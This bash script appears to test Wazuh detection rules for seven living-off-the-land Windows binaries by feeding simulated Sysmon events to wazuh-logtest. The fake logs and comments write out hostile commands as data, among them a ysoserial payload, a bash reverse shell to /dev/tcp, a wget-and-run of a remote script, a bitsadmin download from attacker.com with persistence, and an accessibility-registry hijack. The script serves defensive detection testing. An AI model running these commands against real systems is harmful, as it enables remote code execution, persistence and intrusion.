#!/usr/bin/env bash
# =============================================================================
# LOLBAS Detection Rules — wazuh-logtest Validation Script
# 7 Techniques: AddinUtil · AppInstaller · Aspnet_Compiler · At ·
#               ATBroker · Bash · Bitsadmin
# Usage: bash lolbas_logtest_poc.sh
# Each echo block simulates a realistic Wazuh agent Windows event log.
# =============================================================================

echo "================================================================="
echo "1. AddinUtil.exe — T1218 | Rule 100102 (level 12)"
echo "   PoC: ysoserial payload triggered via -AddinRoot sensitive path"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddinUtil.exe","commandLine":"AddInUtil.exe -AddinRoot:C:\\Users\\hieun\\Desktop\\temp\\","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"-","integrityLevel":"High","processId":"4444","parentProcessId":"5678","utcTime":"2026-04-13 07:00:01.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "1b. AddinUtil.exe — T1218 | Rule 100103 (level 15)"
echo "    PoC: AddinUtil spawned calc.exe (deserialization succeeded)"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\calc.exe","commandLine":"calc.exe","parentImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddinUtil.exe","parentCommandLine":"AddInUtil.exe -AddinRoot:C:\\Users\\hieun\\Desktop\\temp\\","user":"WIN-LAB01\\hieun","originalFileName":"CALC.EXE","integrityLevel":"High","processId":"6789","parentProcessId":"4444","utcTime":"2026-04-13 07:00:02.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "1c. AddinUtil.exe — T1218 | Rule 100108 (level 15)"
echo "    PoC: ysoserial.exe executed to generate payload"
echo "    Command: ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c calc.exe -o raw > Addins.store"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Users\\hieun\\Desktop\\temp\\ysoserial.exe","commandLine":"ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c calc.exe -o raw","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"ysoserial.exe","integrityLevel":"High","processId":"3333","parentProcessId":"5678","utcTime":"2026-04-13 06:59:50.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "1d. AddinUtil.exe — T1218 | Rule 100106 (level 10)"
echo "    PoC: Addins.store file created in sensitive path"
echo "    Command: ysoserial output redirected to Addins.store"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"11","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Users\\hieun\\Desktop\\temp\\ysoserial.exe","targetFilename":"C:\\Users\\hieun\\Desktop\\temp\\Addins.store","creationUtcTime":"2026-04-13 06:59:55.000","processId":"3333","utcTime":"2026-04-13 06:59:55.000"}}}' | /var/ossec/bin/wazuh-logtest


echo ""
echo "================================================================="
echo "2. AppInstaller.exe — T1105 | Rule 100200 (level 12)"
echo "   PoC: ms-appinstaller URI in PowerShell ScriptBlock"
echo "   Command: start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","eventID":"4104","computer":"WIN-LAB01","channel":"Microsoft-Windows-PowerShell/Operational","severityValue":"WARNING"},"eventdata":{"scriptBlockText":"start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw","path":"","messageNumber":"1","messageTotal":"1","scriptBlockId":"{abc-123}"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "2b. AppInstaller.exe — T1105 | Rule 100201 (level 12)"
echo "    PoC: AppInstaller.exe process with ms-appinstaller URI"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.21.0_x64__8wekyb3d8bbwe\\AppInstaller.exe","commandLine":"AppInstaller.exe ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe /c start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw","user":"WIN-LAB01\\hieun","originalFileName":"AppInstaller.exe","integrityLevel":"Medium","processId":"7890","parentProcessId":"5678","utcTime":"2026-04-13 07:05:00.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "2c. AppInstaller.exe — T1105 | Rule 100203 (level 10)"
echo "    PoC: File created in DesktopAppInstaller INetCache"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"11","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.21.0_x64__8wekyb3d8bbwe\\AppInstaller.exe","targetFilename":"C:\\Users\\hieun\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\ABCD1234\\payload.msix","creationUtcTime":"2026-04-13 07:05:03.000","processId":"7890","utcTime":"2026-04-13 07:05:03.000"}}}' | /var/ossec/bin/wazuh-logtest


echo ""
echo "================================================================="
echo "3. Aspnet_Compiler.exe — T1127 | Rule 100211 (level 5)"
echo "   PoC: aspnet_compiler.exe executed (baseline)"
echo "   Command: aspnet_compiler.exe -v none -p C:\\Users\\hieun\\Desktop\\asptest -f C:\\Users\\hieun\\Desktop\\asptest\\none -u"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe","commandLine":"aspnet_compiler.exe -v none -p C:\\Users\\hieun\\Desktop\\asptest -f C:\\Users\\hieun\\Desktop\\asptest\\none -u","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"aspnet_compiler.exe","integrityLevel":"High","processId":"5555","parentProcessId":"5678","utcTime":"2026-04-13 07:10:00.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "3b. Aspnet_Compiler.exe — T1127 | Rule 100213 (level 12)"
echo "    PoC: aspnet_compiler -p pointing to Desktop (sensitive path)"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe","commandLine":"aspnet_compiler.exe -v none -p C:\\Users\\hieun\\Desktop\\asptest -f C:\\temp\\out -u","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"aspnet_compiler.exe","integrityLevel":"High","processId":"5556","parentProcessId":"5678","utcTime":"2026-04-13 07:10:05.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "3c. Aspnet_Compiler.exe — T1127 | Rule 100214 (level 14)"
echo "    PoC: aspnet_compiler spawned cmd.exe (malicious Build Provider)"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\cmd.exe","commandLine":"cmd.exe /c whoami","parentImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe","parentCommandLine":"aspnet_compiler.exe -v none -p C:\\Users\\hieun\\Desktop\\asptest -f C:\\temp\\out -u","user":"WIN-LAB01\\hieun","originalFileName":"cmd.exe","integrityLevel":"High","processId":"5559","parentProcessId":"5556","utcTime":"2026-04-13 07:10:07.000"}}}' | /var/ossec/bin/wazuh-logtest


echo ""
echo "================================================================="
echo "4. At.exe — T1053.002 | Rule 100302 (level 12)"
echo "   PoC: at.exe with /interactive flag"
echo "   Command: at 14:44 /interactive cmd /c notepad.exe"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\at.exe","commandLine":"at 14:44 /interactive cmd /c notepad.exe","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"at.exe","integrityLevel":"High","processId":"2222","parentProcessId":"5678","utcTime":"2026-04-13 07:15:00.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "4b. At.exe — T1053.002 | Rule 100304 (level 13)"
echo "    PoC: at.exe with remote UNC path"
echo "    Command: at \\\\127.0.0.1 14:44 cmd /c \\\\127.0.0.1\\share\\test.exe"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\at.exe","commandLine":"at \\\\127.0.0.1 14:44 cmd /c \\\\127.0.0.1\\share\\test.exe","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"at.exe","integrityLevel":"High","processId":"2223","parentProcessId":"5678","utcTime":"2026-04-13 07:15:30.000"}}}' | /var/ossec/bin/wazuh-logtest


echo ""
echo "================================================================="
echo "5. ATBroker.exe — T1546.008 | Rule 100321 (level 12)"
echo "   PoC: atbroker /start with non-standard (fake) AT name"
echo "   Command: ATBroker.exe /start maliciousAT"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\ATBroker.exe","commandLine":"ATBroker.exe /start maliciousAT","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"ATBroker.exe","integrityLevel":"High","processId":"3399","parentProcessId":"5678","utcTime":"2026-04-13 07:20:00.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "5b. ATBroker.exe — T1546.008 | Rule 100323 (level 13)"
echo "    PoC: Registry modification — fake AT entry with StartExe=cmd.exe"
echo "    Command (PowerShell): New-Item HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\maliciousAT"
echo "                          Set-ItemProperty ... -Name StartExe -Value cmd.exe"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"13","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"eventType":"SetValue","image":"C:\\Windows\\System32\\reg.exe","targetObject":"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\maliciousAT\\StartExe","details":"C:\\Windows\\System32\\cmd.exe","processId":"3400","utcTime":"2026-04-13 07:19:50.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "5c. ATBroker.exe — T1546.008 | Rule 100322 (level 14)"
echo "    PoC: ATBroker spawned cmd.exe (fake AT executed)"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\cmd.exe","commandLine":"\"C:\\Windows\\System32\\cmd.exe\"","parentImage":"C:\\Windows\\System32\\ATBroker.exe","parentCommandLine":"ATBroker.exe /start maliciousAT","user":"WIN-LAB01\\hieun","originalFileName":"cmd.exe","integrityLevel":"High","processId":"3401","parentProcessId":"3399","utcTime":"2026-04-13 07:20:03.000"}}}' | /var/ossec/bin/wazuh-logtest


echo ""
echo "================================================================="
echo "6. Bash.exe — T1202 | Rule 100330 (level 3)"
echo "   PoC: bash.exe execution (baseline)"
echo "   Command: bash.exe -c 'calc.exe'"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bash.exe","commandLine":"bash.exe -c calc.exe","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bash.exe","integrityLevel":"Medium","processId":"4411","parentProcessId":"5678","utcTime":"2026-04-13 07:25:00.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "6b. Bash.exe — T1202 | Rule 100331 (level 12)"
echo "    PoC: bash.exe -c flag (indirect command execution)"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bash.exe","commandLine":"bash.exe -c wget http://192.168.1.100/payload.sh -O /tmp/p.sh && bash /tmp/p.sh","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bash.exe","integrityLevel":"Medium","processId":"4412","parentProcessId":"5678","utcTime":"2026-04-13 07:25:05.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "6c. Bash.exe — T1202 | Rule 100332 (level 13)"
echo "    PoC: bash.exe with /dev/tcp (reverse shell pattern)"
echo "    Command: bash.exe -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bash.exe","commandLine":"bash.exe -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bash.exe","integrityLevel":"Medium","processId":"4413","parentProcessId":"5678","utcTime":"2026-04-13 07:25:10.000"}}}' | /var/ossec/bin/wazuh-logtest


echo ""
echo "================================================================="
echo "7. Bitsadmin.exe — T1197/T1105 | Rule 100404 (level 8)"
echo "   PoC Step 1: Create BITS job"
echo "   Command: bitsadmin /create MyJob"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bitsadmin.exe","commandLine":"bitsadmin /create MyJob","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bitsadmin.exe","integrityLevel":"High","processId":"6600","parentProcessId":"5678","utcTime":"2026-04-13 07:30:00.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "7b. Bitsadmin.exe — T1197/T1105 | Rule 100400 (level 12)"
echo "    PoC Step 2: Add file download URL"
echo "    Command: bitsadmin /addfile MyJob https://attacker.com/payload.exe C:\\temp\\payload.exe"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bitsadmin.exe","commandLine":"bitsadmin /addfile MyJob https://attacker.com/payload.exe C:\\temp\\payload.exe","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bitsadmin.exe","integrityLevel":"High","processId":"6601","parentProcessId":"5678","utcTime":"2026-04-13 07:30:05.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "7c. Bitsadmin.exe — T1197 | Rule 100402 (level 14)"
echo "    PoC Step 3: Set persistence notify command"
echo "    Command: bitsadmin /setnotifycmdline MyJob C:\\temp\\payload.exe NULL"
echo "    (Atomic Red Team T1197 Test #3)"
echo "================================================================="
echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bitsadmin.exe","commandLine":"bitsadmin /setnotifycmdline MyJob C:\\temp\\payload.exe NULL","parentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","parentCommandLine":"powershell.exe -ExecutionPolicy Bypass -Command Invoke-AtomicTest T1197 -TestNumbers 3","user":"WIN-LAB01\\hieun","originalFileName":"bitsadmin.exe","integrityLevel":"High","processId":"6602","parentProcessId":"6580","utcTime":"2026-04-13 07:30:10.000"}}}' | /var/ossec/bin/wazuh-logtest

echo ""
echo "================================================================="
echo "ALL TESTS COMPLETE"
echo "================================================================="
